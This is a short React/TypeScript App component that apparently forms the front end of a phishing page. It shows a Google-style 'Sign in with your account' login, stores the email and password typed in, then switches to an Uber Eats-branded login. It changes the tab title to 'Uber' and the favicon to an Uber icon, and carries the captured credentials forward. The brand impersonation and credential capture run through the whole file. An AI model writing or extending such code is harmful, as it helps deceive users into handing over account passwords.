import { useState, useEffect } from 'react'
import LoginPage from './LoginPage'
import UberEatsLogin from './UberEatsLogin'

function App() {
  const [currentPage, setCurrentPage] = useState<'google' | 'ubereats'>('google')
  const [googleCredentials, setGoogleCredentials] = useState({ email: '', password: '' })

  useEffect(() => {
    if (currentPage === 'ubereats') {
      document.title = 'Uber';
      const link = document.querySelector("link[rel~='icon']") as HTMLLinkElement;
      if (link) {
        link.href = '/uber.svg';
      }
    } else {
      document.title = 'Sign in with your account';
      const link = document.querySelector("link[rel~='icon']") as HTMLLinkElement;
      if (link) {
        link.href = '/vite.svg';
      }
    }
  }, [currentPage]);

  const handleNavigateToUberEats = (email: string, password: string) => {
    setGoogleCredentials({ email, password })
    setCurrentPage('ubereats')
  }

  return (
    <>
      {currentPage === 'google' && <LoginPage onNavigate={handleNavigateToUberEats} />}
      {currentPage === 'ubereats' && <UberEatsLogin googleCredentials={googleCredentials} />}
    </>
  )
}

export default App
